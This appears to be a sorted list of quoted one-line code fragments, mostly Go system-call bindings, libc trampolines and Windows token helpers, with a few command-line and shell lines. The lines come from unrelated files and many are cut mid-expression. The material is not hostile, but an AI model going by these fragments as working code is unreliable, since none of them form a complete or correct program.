"ipStrSlice := make([]string, len("
"ipStrSlice, err := readAsCSV(rmQuote.Replace(val))"
"ipValue, "
"is not executable, meaning that a subcommand is required. This is accomplished"
"isElevated)), uint32(unsafe.Sizeof(isElevated)), "
"isRestricted, err = isTokenRestricted(t)"
"isTokenRestricted(tokenHandle Token) (ret bool, err error) [!failretval] = advapi32.IsTokenRestricted"
"it, "
"italic:    """
"item, err := parseSudoLine(line, hostname)"
"itoa(fd), tv)"
"itv, struct itimerval "
"jobname := []byte("""
"json:""Id"""
"json:""RepoTags"""
"just include the error numbers and error strings, but also the signal numbers"
"keep)), nil"
"keep, err = UTF16PtrFromString(v)"
"kernel                   = syscall.MustLoadDLL(""kernel32.dll"")"
"kevent(int fd, const struct kevent "
"kevent(kq int, change unsafe.Pointer, nchange int, event unsafe.Pointer, nevent int, timeout "
"kexecFileLoad(kernelFd int, initrdFd int, cmdlineLen int, cmdline string, flags int) (err error)"
"key, rest = bytesToKey(rest, t.pasteActive)"
"key=""${BASH_REMATCH[1]}"""
"keyctlDH(cmd int, arg2 "
"keyctlIOV(cmd int, arg2 int, payload []Iovec, arg5 int) (err error) = SYS_KEYCTL"
"keyctlJoin(cmd int, arg2 string) (ret int, err error) = SYS_KEYCTL"
"keyctlRestrictKeyring(cmd int, arg2 int) (err error) = SYS_KEYCTL"
"keyctlRestrictKeyringByType(cmd int, arg2 int, keyType string, restriction string) (err error) = SYS_KEYCTL"
"keyctlSearch(cmd int, arg2 int, arg3 string, arg4 string, arg5 int) (ret int, err error) = SYS_KEYCTL"
"keys := make([]string, len(m))"
"kill(pid int, signum int, posix int) (err error)"
"kill(pid_t pid, int signum)"
"kinfo)), "
"kinfo, nil"
"knownfolders=""$(printf '%s"
"kv := strings.SplitN(pair, ""="", 2)"
"l, e := getSystemDirectory("
"l, e := getSystemWindowsDirectory("
"l, e := getWindowsDirectory("
"l, s = wrapN(wrap, slop, s)"
"l.received = append(l.received, buffer[:n]...)"
"label, const void "
"label, void "
"languages := make([]string, 0, numLanguages)"
"languages = append(languages, string(utf16.Decode(buf[from:i])))"
"last_vtype=""$vtype"""
"left := make(Constraints, len(cs))"
"left, _ = strconv.ParseInt(av.String(), 10, 64)"
"len, 0)"
"len, flags)"
"length, err := KeyctlBuffer(cmd, id, buffer, 0)"
"length, nil, 0)"
"levenshteinDistance := ld(typedName, cmd.Name(), true)"
"libc_accept)), 3, uintptr(s), rsa, addrlen, 0, 0, 0)"
"libc_accept,"
"libc_accept_trampoline_addr(SB), RODATA, $8"
"libc_accept_trampoline_addr(SB)/8, $libc_accept_trampoline<>(SB)"
"libc_access_trampoline_addr(SB), RODATA, $8"
"libc_access_trampoline_addr(SB)/8, $libc_access_trampoline<>(SB)"
"libc_acct)), 1, _p0, 0, 0, 0, 0, 0)"
"libc_acct,"
"libc_adjtime_trampoline_addr(SB), RODATA, $8"
"libc_adjtime_trampoline_addr(SB)/8, $libc_adjtime_trampoline<>(SB)"
"libc_bind)), 3, uintptr(s), addr, addrlen, 0, 0, 0)"
"libc_bind,"
"libc_bind_trampoline_addr(SB), RODATA, $8"
"libc_bind_trampoline_addr(SB)/8, $libc_bind_trampoline<>(SB)"
"libc_chdir)), 1, _p0, 0, 0, 0, 0, 0)"
"libc_chdir,"
"libc_chdir_trampoline_addr(SB), RODATA, $8"
"libc_chdir_trampoline_addr(SB)/8, $libc_chdir_trampoline<>(SB)"
"libc_chflags_trampoline_addr(SB), RODATA, $8"
"libc_chflags_trampoline_addr(SB)/8, $libc_chflags_trampoline<>(SB)"
"libc_chmod_trampoline_addr(SB), RODATA, $8"
"libc_chmod_trampoline_addr(SB)/8, $libc_chmod_trampoline<>(SB)"
"libc_chown_trampoline_addr(SB), RODATA, $8"
"libc_chown_trampoline_addr(SB)/8, $libc_chown_trampoline<>(SB)"
"libc_chroot)), 1, _p0, 0, 0, 0, 0, 0)"
"libc_chroot,"
"libc_chroot_trampoline_addr(SB), RODATA, $8"
"libc_chroot_trampoline_addr(SB)/8, $libc_chroot_trampoline<>(SB)"
"libc_clock_gettime_trampoline_addr(SB), RODATA, $8"
"libc_clock_gettime_trampoline_addr(SB)/8, $libc_clock_gettime_trampoline<>(SB)"
"libc_clonefile_trampoline_addr(SB), RODATA, $8"
"libc_clonefile_trampoline_addr(SB)/8, $libc_clonefile_trampoline<>(SB)"
"libc_clonefileat_trampoline_addr(SB), RODATA, $8"
"libc_clonefileat_trampoline_addr(SB)/8, $libc_clonefileat_trampoline<>(SB)"
"libc_close)), 1, uintptr(fd), 0, 0, 0, 0, 0)"
"libc_close,"
"libc_close_trampoline_addr(SB), RODATA, $8"
"libc_close_trampoline_addr(SB)/8, $libc_close_trampoline<>(SB)"
"libc_closedir_trampoline_addr(SB), RODATA, $8"
"libc_closedir_trampoline_addr(SB)/8, $libc_closedir_trampoline<>(SB)"
"libc_connect)), 3, uintptr(s), addr, addrlen, 0, 0, 0)"
"libc_connect,"
"libc_connect_trampoline_addr(SB), RODATA, $8"
"libc_connect_trampoline_addr(SB)/8, $libc_connect_trampoline<>(SB)"
"libc_dup)), 1, uintptr(oldfd), 0, 0, 0, 0, 0)"
"libc_dup,"
"libc_dup2)), 2, uintptr(oldfd), uintptr(newfd), 0, 0, 0, 0)"
"libc_dup2,"
"libc_dup2_trampoline_addr(SB), RODATA, $8"
"libc_dup2_trampoline_addr(SB)/8, $libc_dup2_trampoline<>(SB)"
"libc_dup_trampoline_addr(SB), RODATA, $8"
"libc_dup_trampoline_addr(SB)/8, $libc_dup_trampoline<>(SB)"
"libc_exchangedata_trampoline_addr(SB), RODATA, $8"
"libc_exchangedata_trampoline_addr(SB)/8, $libc_exchangedata_trampoline<>(SB)"
"libc_exit)), 1, uintptr(code), 0, 0, 0, 0, 0)"
"libc_exit,"
"libc_exit_trampoline_addr(SB), RODATA, $8"
"libc_exit_trampoline_addr(SB)/8, $libc_exit_trampoline<>(SB)"
"libc_faccessat)), 4, uintptr(dirfd), _p0, uintptr(mode), uintptr(flags), 0, 0)"
"libc_faccessat,"
"libc_faccessat_trampoline_addr(SB), RODATA, $8"
"libc_faccessat_trampoline_addr(SB)/8, $libc_faccessat_trampoline<>(SB)"
"libc_fchdir)), 1, uintptr(fd), 0, 0, 0, 0, 0)"
"libc_fchdir,"
"libc_fchdir_trampoline_addr(SB), RODATA, $8"
"libc_fchdir_trampoline_addr(SB)/8, $libc_fchdir_trampoline<>(SB)"
"libc_fchflags_trampoline_addr(SB), RODATA, $8"
"libc_fchflags_trampoline_addr(SB)/8, $libc_fchflags_trampoline<>(SB)"
"libc_fchmod)), 2, uintptr(fd), uintptr(mode), 0, 0, 0, 0)"
"libc_fchmod,"
"libc_fchmod_trampoline_addr(SB), RODATA, $8"
"libc_fchmod_trampoline_addr(SB)/8, $libc_fchmod_trampoline<>(SB)"
"libc_fchmodat)), 4, uintptr(dirfd), _p0, uintptr(mode), uintptr(flags), 0, 0)"
"libc_fchmodat,"
"libc_fchmodat_trampoline_addr(SB), RODATA, $8"
"libc_fchmodat_trampoline_addr(SB)/8, $libc_fchmodat_trampoline<>(SB)"
"libc_fchown)), 3, uintptr(fd), uintptr(uid), uintptr(gid), 0, 0, 0)"
"libc_fchown,"
"libc_fchown_trampoline_addr(SB), RODATA, $8"
"libc_fchown_trampoline_addr(SB)/8, $libc_fchown_trampoline<>(SB)"
"libc_fchownat)), 5, uintptr(dirfd), _p0, uintptr(uid), uintptr(gid), uintptr(flags), 0)"
"libc_fchownat,"
"libc_fchownat_trampoline_addr(SB), RODATA, $8"
"libc_fchownat_trampoline_addr(SB)/8, $libc_fchownat_trampoline<>(SB)"
"libc_fclonefileat_trampoline_addr(SB), RODATA, $8"
"libc_fclonefileat_trampoline_addr(SB)/8, $libc_fclonefileat_trampoline<>(SB)"
"libc_fcntl)), 3, fd, uintptr(cmd), arg, 0, 0, 0)"
"libc_fcntl,"
"libc_fcntl_trampoline_addr(SB), RODATA, $8"
"libc_fcntl_trampoline_addr(SB)/8, $libc_fcntl_trampoline<>(SB)"
"libc_fdatasync)), 1, uintptr(fd), 0, 0, 0, 0, 0)"
"libc_fdatasync,"
"libc_fdopendir_trampoline_addr(SB), RODATA, $8"
"libc_fdopendir_trampoline_addr(SB)/8, $libc_fdopendir_trampoline<>(SB)"
"libc_fgetxattr_trampoline_addr(SB), RODATA, $8"
"libc_fgetxattr_trampoline_addr(SB)/8, $libc_fgetxattr_trampoline<>(SB)"
"libc_flistxattr_trampoline_addr(SB), RODATA, $8"
"libc_flistxattr_trampoline_addr(SB)/8, $libc_flistxattr_trampoline<>(SB)"
"libc_flock_trampoline_addr(SB), RODATA, $8"
"libc_flock_trampoline_addr(SB)/8, $libc_flock_trampoline<>(SB)"
"libc_fpathconf_trampoline_addr(SB), RODATA, $8"
"libc_fpathconf_trampoline_addr(SB)/8, $libc_fpathconf_trampoline<>(SB)"
"libc_fremovexattr_trampoline_addr(SB), RODATA, $8"
"libc_fremovexattr_trampoline_addr(SB)/8, $libc_fremovexattr_trampoline<>(SB)"
"libc_fsetxattr_trampoline_addr(SB), RODATA, $8"
"libc_fsetxattr_trampoline_addr(SB)/8, $libc_fsetxattr_trampoline<>(SB)"
"libc_fstat)), 2, uintptr(fd), stat, 0, 0, 0, 0)"
"libc_fstat,"
"libc_fstat64_trampoline_addr(SB), RODATA, $8"
"libc_fstat64_trampoline_addr(SB)/8, $libc_fstat64_trampoline<>(SB)"
"libc_fstat_trampoline_addr(SB), RODATA, $8"
"libc_fstat_trampoline_addr(SB)/8, $libc_fstat_trampoline<>(SB)"
"libc_fstatat)), 4, uintptr(dirfd), _p0, stat, uintptr(flags), 0, 0)"
"libc_fstatat,"
"libc_fstatat64_trampoline_addr(SB), RODATA, $8"
"libc_fstatat64_trampoline_addr(SB)/8, $libc_fstatat64_trampoline<>(SB)"
"libc_fstatat_trampoline_addr(SB), RODATA, $8"
"libc_fstatat_trampoline_addr(SB)/8, $libc_fstatat_trampoline<>(SB)"
"libc_fstatfs)), 2, uintptr(fd), buf, 0, 0, 0, 0)"
"libc_fstatfs,"
"libc_fstatfs64_trampoline_addr(SB), RODATA, $8"
"libc_fstatfs64_trampoline_addr(SB)/8, $libc_fstatfs64_trampoline<>(SB)"
"libc_fstatfs_trampoline_addr(SB), RODATA, $8"
"libc_fstatfs_trampoline_addr(SB)/8, $libc_fstatfs_trampoline<>(SB)"
"libc_fsync_range)), 4, uintptr(fd), uintptr(how), uintptr(start), uintptr(length), 0, 0)"
"libc_fsync_range,"
"libc_fsync_trampoline_addr(SB), RODATA, $8"
"libc_fsync_trampoline_addr(SB)/8, $libc_fsync_trampoline<>(SB)"
"libc_ftruncate)), 2, uintptr(fd), uintptr(length), 0, 0, 0, 0)"
"libc_ftruncate,"
"libc_ftruncate_trampoline_addr(SB), RODATA, $8"
"libc_ftruncate_trampoline_addr(SB)/8, $libc_ftruncate_trampoline<>(SB)"
"libc_futimes_trampoline_addr(SB), RODATA, $8"
"libc_futimes_trampoline_addr(SB)/8, $libc_futimes_trampoline<>(SB)"
"libc_getcwd)), 2, _p0, uintptr(_lenp0), 0, 0, 0, 0)"
"libc_getcwd,"
"libc_getcwd_trampoline_addr(SB), RODATA, $8"
"libc_getcwd_trampoline_addr(SB)/8, $libc_getcwd_trampoline<>(SB)"
"libc_getdirent)), 3, uintptr(fd), _p0, uintptr(_lenp0), 0, 0, 0)"
"libc_getdirent,"
"libc_getdtablesize_trampoline_addr(SB), RODATA, $8"
"libc_getdtablesize_trampoline_addr(SB)/8, $libc_getdtablesize_trampoline<>(SB)"
"libc_getegid)), 0, 0, 0, 0, 0, 0, 0)"
"libc_getegid,"
"libc_getegid_trampoline_addr(SB), RODATA, $8"
"libc_getegid_trampoline_addr(SB)/8, $libc_getegid_trampoline<>(SB)"
"libc_geteuid)), 0, 0, 0, 0, 0, 0, 0)"
"libc_geteuid,"
"libc_geteuid_trampoline_addr(SB), RODATA, $8"
"libc_geteuid_trampoline_addr(SB)/8, $libc_geteuid_trampoline<>(SB)"
"libc_getfsstat64_trampoline_addr(SB), RODATA, $8"
"libc_getfsstat64_trampoline_addr(SB)/8, $libc_getfsstat64_trampoline<>(SB)"
"libc_getfsstat_trampoline_addr(SB), RODATA, $8"
"libc_getfsstat_trampoline_addr(SB)/8, $libc_getfsstat_trampoline<>(SB)"
"libc_getgid)), 0, 0, 0, 0, 0, 0, 0)"
"libc_getgid,"
"libc_getgid_trampoline_addr(SB), RODATA, $8"
"libc_getgid_trampoline_addr(SB)/8, $libc_getgid_trampoline<>(SB)"
"libc_getgroups)), 2, uintptr(n), list, 0, 0, 0, 0)"
"libc_getgroups,"
"libc_getgroups_trampoline_addr(SB), RODATA, $8"
"libc_getgroups_trampoline_addr(SB)/8, $libc_getgroups_trampoline<>(SB)"
"libc_getpeername)), 3, uintptr(fd), rsa, addrlen, 0, 0, 0)"
"libc_getpeername,"
"libc_getpeername_trampoline_addr(SB), RODATA, $8"
"libc_getpeername_trampoline_addr(SB)/8, $libc_getpeername_trampoline<>(SB)"
"libc_getpgid)), 1, uintptr(pid), 0, 0, 0, 0, 0)"
"libc_getpgid,"
"libc_getpgid_trampoline_addr(SB), RODATA, $8"
"libc_getpgid_trampoline_addr(SB)/8, $libc_getpgid_trampoline<>(SB)"
"libc_getpgrp)), 0, 0, 0, 0, 0, 0, 0)"
"libc_getpgrp,"
"libc_getpgrp_trampoline_addr(SB), RODATA, $8"
"libc_getpgrp_trampoline_addr(SB)/8, $libc_getpgrp_trampoline<>(SB)"
"libc_getpid)), 0, 0, 0, 0, 0, 0, 0)"
"libc_getpid,"
"libc_getpid_trampoline_addr(SB), RODATA, $8"
"libc_getpid_trampoline_addr(SB)/8, $libc_getpid_trampoline<>(SB)"
"libc_getppid)), 0, 0, 0, 0, 0, 0, 0)"
"libc_getppid,"
"libc_getppid_trampoline_addr(SB), RODATA, $8"
"libc_getppid_trampoline_addr(SB)/8, $libc_getppid_trampoline<>(SB)"
"libc_getpriority)), 2, uintptr(which), uintptr(who), 0, 0, 0, 0)"
"libc_getpriority,"
"libc_getpriority_trampoline_addr(SB), RODATA, $8"
"libc_getpriority_trampoline_addr(SB)/8, $libc_getpriority_trampoline<>(SB)"
"libc_getrlimit)), 2, uintptr(resource), rlim, 0, 0, 0, 0)"
"libc_getrlimit,"
"libc_getrlimit_trampoline_addr(SB), RODATA, $8"
"libc_getrlimit_trampoline_addr(SB)/8, $libc_getrlimit_trampoline<>(SB)"
"libc_getrusage)), 2, uintptr(who), rusage, 0, 0, 0, 0)"
"libc_getrusage,"
"libc_getrusage_trampoline_addr(SB), RODATA, $8"
"libc_getrusage_trampoline_addr(SB)/8, $libc_getrusage_trampoline<>(SB)"
"libc_getsid)), 1, uintptr(pid), 0, 0, 0, 0, 0)"
"libc_getsid,"
"libc_getsid_trampoline_addr(SB), RODATA, $8"
"libc_getsid_trampoline_addr(SB)/8, $libc_getsid_trampoline<>(SB)"
"libc_getsockname)), 3, uintptr(fd), rsa, addrlen, 0, 0, 0)"
"libc_getsockname,"
"libc_getsockname_trampoline_addr(SB), RODATA, $8"
"libc_getsockname_trampoline_addr(SB)/8, $libc_getsockname_trampoline<>(SB)"
"libc_getsockopt)), 5, uintptr(s), uintptr(level), uintptr(name), val, vallen, 0)"
"libc_getsockopt,"
"libc_getsockopt_trampoline_addr(SB), RODATA, $8"
"libc_getsockopt_trampoline_addr(SB)/8, $libc_getsockopt_trampoline<>(SB)"
"libc_getsystemcfg)), 1, uintptr(label), 0, 0, 0, 0, 0)"
"libc_getsystemcfg,"
"libc_gettimeofday)), 2, tv, tzp, 0, 0, 0, 0)"
"libc_gettimeofday,"
"libc_gettimeofday_trampoline_addr(SB), RODATA, $8"
"libc_gettimeofday_trampoline_addr(SB)/8, $libc_gettimeofday_trampoline<>(SB)"
"libc_getuid)), 0, 0, 0, 0, 0, 0, 0)"
"libc_getuid,"
"libc_getuid_trampoline_addr(SB), RODATA, $8"
"libc_getuid_trampoline_addr(SB)/8, $libc_getuid_trampoline<>(SB)"
"libc_getxattr_trampoline_addr(SB), RODATA, $8"
"libc_getxattr_trampoline_addr(SB)/8, $libc_getxattr_trampoline<>(SB)"
"libc_ioctl)), 3, uintptr(fd), uintptr(req), arg, 0, 0, 0)"
"libc_ioctl,"
"libc_ioctl_trampoline_addr(SB), RODATA, $8"
"libc_ioctl_trampoline_addr(SB)/8, $libc_ioctl_trampoline<>(SB)"
"libc_issetugid_trampoline_addr(SB), RODATA, $8"
"libc_issetugid_trampoline_addr(SB)/8, $libc_issetugid_trampoline<>(SB)"
"libc_kevent_trampoline_addr(SB), RODATA, $8"
"libc_kevent_trampoline_addr(SB)/8, $libc_kevent_trampoline<>(SB)"
"libc_kill)), 2, uintptr(pid), uintptr(sig), 0, 0, 0, 0)"
"libc_kill,"
"libc_kill_trampoline_addr(SB), RODATA, $8"
"libc_kill_trampoline_addr(SB)/8, $libc_kill_trampoline<>(SB)"
"libc_kqueue_trampoline_addr(SB), RODATA, $8"
"libc_kqueue_trampoline_addr(SB)/8, $libc_kqueue_trampoline<>(SB)"
"libc_lchown)), 3, _p0, uintptr(uid), uintptr(gid), 0, 0, 0)"
"libc_lchown,"
"libc_lchown_trampoline_addr(SB), RODATA, $8"
"libc_lchown_trampoline_addr(SB)/8, $libc_lchown_trampoline<>(SB)"
"libc_link_trampoline_addr(SB), RODATA, $8"
"libc_link_trampoline_addr(SB)/8, $libc_link_trampoline<>(SB)"
"libc_linkat_trampoline_addr(SB), RODATA, $8"
"libc_linkat_trampoline_addr(SB)/8, $libc_linkat_trampoline<>(SB)"
"libc_listen)), 2, uintptr(s), uintptr(n), 0, 0, 0, 0)"
"libc_listen,"
"libc_listen_trampoline_addr(SB), RODATA, $8"
"libc_listen_trampoline_addr(SB)/8, $libc_listen_trampoline<>(SB)"
"libc_listxattr_trampoline_addr(SB), RODATA, $8"
"libc_listxattr_trampoline_addr(SB)/8, $libc_listxattr_trampoline<>(SB)"
"libc_lseek)), 3, uintptr(fd), uintptr(offset), uintptr(whence), 0, 0, 0)"
"libc_lseek,"
"libc_lseek_trampoline_addr(SB), RODATA, $8"
"libc_lseek_trampoline_addr(SB)/8, $libc_lseek_trampoline<>(SB)"
"libc_lstat)), 2, _p0, stat, 0, 0, 0, 0)"
"libc_lstat,"
"libc_lstat64_trampoline_addr(SB), RODATA, $8"
"libc_lstat64_trampoline_addr(SB)/8, $libc_lstat64_trampoline<>(SB)"
"libc_lstat_trampoline_addr(SB), RODATA, $8"
"libc_lstat_trampoline_addr(SB)/8, $libc_lstat_trampoline<>(SB)"
"libc_madvise)), 3, _p0, uintptr(_lenp0), uintptr(advice), 0, 0, 0)"
"libc_madvise,"
"libc_madvise_trampoline_addr(SB), RODATA, $8"
"libc_madvise_trampoline_addr(SB)/8, $libc_madvise_trampoline<>(SB)"
"libc_mkdir)), 3, uintptr(dirfd), _p0, uintptr(mode), 0, 0, 0)"
"libc_mkdir,"
"libc_mkdir_trampoline_addr(SB), RODATA, $8"
"libc_mkdir_trampoline_addr(SB)/8, $libc_mkdir_trampoline<>(SB)"
"libc_mkdirat)), 3, uintptr(dirfd), _p0, uintptr(mode), 0, 0, 0)"
"libc_mkdirat,"
"libc_mkdirat_trampoline_addr(SB), RODATA, $8"
"libc_mkdirat_trampoline_addr(SB)/8, $libc_mkdirat_trampoline<>(SB)"
"libc_mkfifo)), 2, _p0, uintptr(mode), 0, 0, 0, 0)"
"libc_mkfifo,"
"libc_mkfifo_trampoline_addr(SB), RODATA, $8"
"libc_mkfifo_trampoline_addr(SB)/8, $libc_mkfifo_trampoline<>(SB)"
"libc_mknod)), 3, _p0, uintptr(mode), uintptr(dev), 0, 0, 0)"
"libc_mknod,"
"libc_mknod_trampoline_addr(SB), RODATA, $8"
"libc_mknod_trampoline_addr(SB)/8, $libc_mknod_trampoline<>(SB)"
"libc_mknodat)), 4, uintptr(dirfd), _p0, uintptr(mode), uintptr(dev), 0, 0)"
"libc_mknodat,"
"libc_mlock)), 2, _p0, uintptr(_lenp0), 0, 0, 0, 0)"
"libc_mlock,"
"libc_mlock_trampoline_addr(SB), RODATA, $8"
"libc_mlock_trampoline_addr(SB)/8, $libc_mlock_trampoline<>(SB)"
"libc_mlockall)), 1, uintptr(flags), 0, 0, 0, 0, 0)"
"libc_mlockall,"
"libc_mlockall_trampoline_addr(SB), RODATA, $8"
"libc_mlockall_trampoline_addr(SB)/8, $libc_mlockall_trampoline<>(SB)"
"libc_mmap64)), 6, addr, length, uintptr(prot), uintptr(flags), uintptr(fd), uintptr(offset))"
"libc_mmap_trampoline_addr(SB), RODATA, $8"
"libc_mmap_trampoline_addr(SB)/8, $libc_mmap_trampoline<>(SB)"
"libc_mount_trampoline_addr(SB), RODATA, $8"
"libc_mount_trampoline_addr(SB)/8, $libc_mount_trampoline<>(SB)"
"libc_mprotect)), 3, _p0, uintptr(_lenp0), uintptr(prot), 0, 0, 0)"
"libc_mprotect,"
"libc_mprotect_trampoline_addr(SB), RODATA, $8"
"libc_mprotect_trampoline_addr(SB)/8, $libc_mprotect_trampoline<>(SB)"
"libc_msync)), 3, _p0, uintptr(_lenp0), uintptr(flags), 0, 0, 0)"
"libc_msync,"
"libc_msync_trampoline_addr(SB), RODATA, $8"
"libc_msync_trampoline_addr(SB)/8, $libc_msync_trampoline<>(SB)"
"libc_munlock)), 2, _p0, uintptr(_lenp0), 0, 0, 0, 0)"
"libc_munlock,"
"libc_munlock_trampoline_addr(SB), RODATA, $8"
"libc_munlock_trampoline_addr(SB)/8, $libc_munlock_trampoline<>(SB)"
"libc_munlockall)), 0, 0, 0, 0, 0, 0, 0)"
"libc_munlockall,"
"libc_munlockall_trampoline_addr(SB), RODATA, $8"
"libc_munlockall_trampoline_addr(SB)/8, $libc_munlockall_trampoline<>(SB)"
"libc_munmap)), 2, addr, length, 0, 0, 0, 0)"
"libc_munmap,"
"libc_munmap_trampoline_addr(SB), RODATA, $8"
"libc_munmap_trampoline_addr(SB)/8, $libc_munmap_trampoline<>(SB)"
"libc_nanosleep)), 2, time, leftover, 0, 0, 0, 0)"
"libc_nanosleep,"
"libc_nrecvmsg)), 3, uintptr(s), msg, uintptr(flags), 0, 0, 0)"
"libc_nrecvmsg,"
"libc_nsendmsg)), 3, uintptr(s), msg, uintptr(flags), 0, 0, 0)"
"libc_nsendmsg,"
"libc_open64)), 3, _p0, uintptr(mode), uintptr(perm), 0, 0, 0)"
"libc_open64,"
"libc_open_trampoline_addr(SB), RODATA, $8"
"libc_open_trampoline_addr(SB)/8, $libc_open_trampoline<>(SB)"
"libc_openat)), 4, uintptr(dirfd), _p0, uintptr(flags), uintptr(mode), 0, 0)"
"libc_openat,"
"libc_openat_trampoline_addr(SB), RODATA, $8"
"libc_openat_trampoline_addr(SB)/8, $libc_openat_trampoline<>(SB)"
"libc_pathconf_trampoline_addr(SB), RODATA, $8"
"libc_pathconf_trampoline_addr(SB)/8, $libc_pathconf_trampoline<>(SB)"
"libc_pause)), 0, 0, 0, 0, 0, 0, 0)"
"libc_pause,"
"libc_pipe)), 1, p, 0, 0, 0, 0, 0)"
"libc_pipe,"
"libc_pipe_trampoline_addr(SB), RODATA, $8"
"libc_pipe_trampoline_addr(SB)/8, $libc_pipe_trampoline<>(SB)"
"libc_poll)), 3, fds, uintptr(nfds), uintptr(timeout), 0, 0, 0)"
"libc_poll,"
"libc_poll_trampoline_addr(SB), RODATA, $8"
"libc_poll_trampoline_addr(SB)/8, $libc_poll_trampoline<>(SB)"
"libc_posix_fadvise64)), 4, uintptr(fd), uintptr(offset), uintptr(length), uintptr(advice), 0, 0)"
"libc_posix_fadvise64,"
"libc_pread64)), 4, uintptr(fd), _p0, uintptr(_lenp0), uintptr(offset), 0, 0)"
"libc_pread64,"
"libc_pread_trampoline_addr(SB), RODATA, $8"
"libc_pread_trampoline_addr(SB)/8, $libc_pread_trampoline<>(SB)"
"libc_pselect)), 6, uintptr(nfd), r, w, e, timeout, sigmask)"
"libc_pselect,"
"libc_ptrace_trampoline_addr(SB), RODATA, $8"
"libc_ptrace_trampoline_addr(SB)/8, $libc_ptrace_trampoline<>(SB)"
"libc_pwrite64)), 4, uintptr(fd), _p0, uintptr(_lenp0), uintptr(offset), 0, 0)"
"libc_pwrite64,"
"libc_pwrite_trampoline_addr(SB), RODATA, $8"
"libc_pwrite_trampoline_addr(SB)/8, $libc_pwrite_trampoline<>(SB)"
"libc_read)), 3, uintptr(fd), _p0, uintptr(_lenp0), 0, 0, 0)"
"libc_read,"
"libc_read_trampoline_addr(SB), RODATA, $8"
"libc_read_trampoline_addr(SB)/8, $libc_read_trampoline<>(SB)"
"libc_readdir_r_trampoline_addr(SB), RODATA, $8"
"libc_readdir_r_trampoline_addr(SB)/8, $libc_readdir_r_trampoline<>(SB)"
"libc_readlink)), 3, _p0, _p1, uintptr(_lenp1), 0, 0, 0)"
"libc_readlink,"
"libc_readlink_trampoline_addr(SB), RODATA, $8"
"libc_readlink_trampoline_addr(SB)/8, $libc_readlink_trampoline<>(SB)"
"libc_readlinkat_trampoline_addr(SB), RODATA, $8"
"libc_readlinkat_trampoline_addr(SB)/8, $libc_readlinkat_trampoline<>(SB)"
"libc_recvfrom)), 6, uintptr(fd), _p0, uintptr(_lenp0), uintptr(flags), from, fromlen)"
"libc_recvfrom,"
"libc_recvfrom_trampoline_addr(SB), RODATA, $8"
"libc_recvfrom_trampoline_addr(SB)/8, $libc_recvfrom_trampoline<>(SB)"
"libc_recvmsg_trampoline_addr(SB), RODATA, $8"
"libc_recvmsg_trampoline_addr(SB)/8, $libc_recvmsg_trampoline<>(SB)"
"libc_removexattr_trampoline_addr(SB), RODATA, $8"
"libc_removexattr_trampoline_addr(SB)/8, $libc_removexattr_trampoline<>(SB)"
"libc_rename_trampoline_addr(SB), RODATA, $8"
"libc_rename_trampoline_addr(SB)/8, $libc_rename_trampoline<>(SB)"
"libc_renameat)), 4, uintptr(olddirfd), _p0, uintptr(newdirfd), _p1, 0, 0)"
"libc_renameat,"
"libc_renameat_trampoline_addr(SB), RODATA, $8"
"libc_renameat_trampoline_addr(SB)/8, $libc_renameat_trampoline<>(SB)"
"libc_revoke_trampoline_addr(SB), RODATA, $8"
"libc_revoke_trampoline_addr(SB)/8, $libc_revoke_trampoline<>(SB)"
"libc_rmdir_trampoline_addr(SB), RODATA, $8"
"libc_rmdir_trampoline_addr(SB)/8, $libc_rmdir_trampoline<>(SB)"
"libc_select)), 5, uintptr(nfd), r, w, e, timeout, 0)"
"libc_select,"
"libc_select_trampoline_addr(SB), RODATA, $8"
"libc_select_trampoline_addr(SB)/8, $libc_select_trampoline<>(SB)"
"libc_sendfile_trampoline_addr(SB), RODATA, $8"
"libc_sendfile_trampoline_addr(SB)/8, $libc_sendfile_trampoline<>(SB)"
"libc_sendmsg_trampoline_addr(SB), RODATA, $8"
"libc_sendmsg_trampoline_addr(SB)/8, $libc_sendmsg_trampoline<>(SB)"
"libc_sendto)), 6, uintptr(s), _p0, uintptr(_lenp0), uintptr(flags), to, addrlen)"
"libc_sendto,"
"libc_sendto_trampoline_addr(SB), RODATA, $8"
"libc_sendto_trampoline_addr(SB)/8, $libc_sendto_trampoline<>(SB)"
"libc_setdomainname)), 2, _p0, uintptr(_lenp0), 0, 0, 0, 0)"
"libc_setdomainname,"
"libc_setegid_trampoline_addr(SB), RODATA, $8"
"libc_setegid_trampoline_addr(SB)/8, $libc_setegid_trampoline<>(SB)"
"libc_seteuid_trampoline_addr(SB), RODATA, $8"
"libc_seteuid_trampoline_addr(SB)/8, $libc_seteuid_trampoline<>(SB)"
"libc_setgid)), 1, uintptr(uid), 0, 0, 0, 0, 0)"
"libc_setgid,"
"libc_setgid_trampoline_addr(SB), RODATA, $8"
"libc_setgid_trampoline_addr(SB)/8, $libc_setgid_trampoline<>(SB)"
"libc_setgroups)), 2, uintptr(n), list, 0, 0, 0, 0)"
"libc_setgroups,"
"libc_setgroups_trampoline_addr(SB), RODATA, $8"
"libc_setgroups_trampoline_addr(SB)/8, $libc_setgroups_trampoline<>(SB)"
"libc_sethostname)), 2, _p0, uintptr(_lenp0), 0, 0, 0, 0)"
"libc_sethostname,"
"libc_setlogin_trampoline_addr(SB), RODATA, $8"
"libc_setlogin_trampoline_addr(SB)/8, $libc_setlogin_trampoline<>(SB)"
"libc_setpgid)), 2, uintptr(pid), uintptr(pgid), 0, 0, 0, 0)"
"libc_setpgid,"
"libc_setpgid_trampoline_addr(SB), RODATA, $8"
"libc_setpgid_trampoline_addr(SB)/8, $libc_setpgid_trampoline<>(SB)"
"libc_setpriority)), 3, uintptr(which), uintptr(who), uintptr(prio), 0, 0, 0)"
"libc_setpriority,"
"libc_setpriority_trampoline_addr(SB), RODATA, $8"
"libc_setpriority_trampoline_addr(SB)/8, $libc_setpriority_trampoline<>(SB)"
"libc_setprivexec_trampoline_addr(SB), RODATA, $8"
"libc_setprivexec_trampoline_addr(SB)/8, $libc_setprivexec_trampoline<>(SB)"
"libc_setregid)), 2, uintptr(rgid), uintptr(egid), 0, 0, 0, 0)"
"libc_setregid,"
"libc_setregid_trampoline_addr(SB), RODATA, $8"
"libc_setregid_trampoline_addr(SB)/8, $libc_setregid_trampoline<>(SB)"
"libc_setreuid)), 2, uintptr(ruid), uintptr(euid), 0, 0, 0, 0)"
"libc_setreuid,"
"libc_setreuid_trampoline_addr(SB), RODATA, $8"
"libc_setreuid_trampoline_addr(SB)/8, $libc_setreuid_trampoline<>(SB)"
"libc_setrlimit)), 2, uintptr(resource), rlim, 0, 0, 0, 0)"
"libc_setrlimit,"
"libc_setrlimit_trampoline_addr(SB), RODATA, $8"
"libc_setrlimit_trampoline_addr(SB)/8, $libc_setrlimit_trampoline<>(SB)"
